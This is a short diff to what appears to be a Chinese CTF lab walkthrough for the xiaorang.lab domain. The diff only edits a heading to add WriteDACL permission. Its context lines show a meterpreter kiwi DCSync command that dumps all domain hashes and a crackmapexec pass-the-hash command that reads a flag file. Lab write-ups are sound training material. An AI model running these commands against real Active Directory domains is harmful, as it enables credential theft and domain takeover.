@@ -37,7 +37,7 @@ meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
 proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
 ```
 
-#### 添加 DCSync 权限, 见 春秋云境——Exchange/Delivery
+#### 添加 DCSync 权限/WriteDACL权限, 见 春秋云境——Exchange/Delivery
 
 ```sh
 # 方式一
